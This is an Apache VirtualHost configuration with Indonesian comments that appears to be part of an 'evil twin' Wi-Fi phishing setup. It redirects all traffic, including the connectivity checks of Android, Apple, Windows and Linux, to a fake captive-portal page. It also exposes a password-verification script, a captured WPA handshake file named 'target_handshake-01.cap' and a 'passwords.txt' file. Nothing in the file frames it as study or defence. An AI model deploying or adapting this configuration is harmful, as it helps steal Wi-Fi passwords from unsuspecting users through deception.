<VirtualHost *:80>

    # ========================================
    # Konfigurasi dasar VirtualHost
    # ========================================
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined


    # ========================================
    # Aktifkan fitur mod_rewrite
    # Wajib supaya aturan RewriteRule bisa jalan
    # ========================================
    RewriteEngine On


    # ========================================
    # Tangani request ROOT "/"
    # Kalau user akses http://10.10.10.1/
    # langsung diarahkan ke index.html
    # ========================================
    RewriteRule ^$ /index.html [L]


    # ========================================
    # File yang BOLEH diakses langsung
    # File ini TIDAK akan kena redirect
    # ========================================
    RewriteCond %{REQUEST_URI} ^/(index\.html|verifikasi\.php|target_handshake-01\.cap|passwords\.txt)$ [NC]
    RewriteRule ^ - [L]


    # ========================================
    # Deteksi Captive Portal OS
    # Semua diarahkan ke index.html
    # ========================================

    # -------- ANDROID --------
    RewriteRule ^(generate_204|gen_204)$ /index.html [L]
    RewriteRule ^connectivitycheck\.gstatic\.com$ /index.html [L]

    # -------- APPLE (iOS / macOS) --------
    RewriteRule ^hotspot-detect\.html$ /index.html [L]
    RewriteRule ^library/test/success\.html$ /index.html [L]
    RewriteRule ^captive\.apple\.com$ /index.html [L]

    # -------- WINDOWS --------
    RewriteRule ^connecttest\.txt$ /index.html [L]
    RewriteRule ^ncsi\.txt$ /index.html [L]
    RewriteRule ^msftconnecttest\.com$ /index.html [L]
    RewriteRule ^msftncsi\.com$ /index.html [L]

    # -------- LINUX --------
    RewriteRule ^check_network_status\.(txt|xml)$ /index.html [L]
    RewriteRule ^nmcheck\.gnome\.org$ /index.html [L]
    RewriteRule ^connectivity-check\.ubuntu\.com$ /index.html [L]


    # ========================================
    # RULE TERAKHIR (fallback)
    # Semua request lain diarahkan ke index.html
    # ========================================
    RewriteRule ^.*$ /index.html [L]

</VirtualHost>
